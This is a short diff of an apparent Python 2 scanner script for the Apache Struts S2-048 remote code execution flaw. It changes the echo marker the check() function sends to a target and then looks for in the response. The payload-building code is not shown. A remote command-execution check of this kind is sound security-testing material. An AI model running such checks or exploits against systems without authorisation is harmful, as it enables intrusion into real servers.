@@ -29,9 +29,9 @@ def post(url, data):
         print e
         exit()
 def check(url):
-    data=request('echo dragonegg')
+    data=request('echo VULN')
     res = post(url, data)
-    if 'dragonegg' in res:
+    if 'VULN' in res:
         print 's2-048 \033[1;32m EXISTS \033[0m!'
     else:
         print 's2-048 \033[1;31m NOT EXISTS \033[0m!'
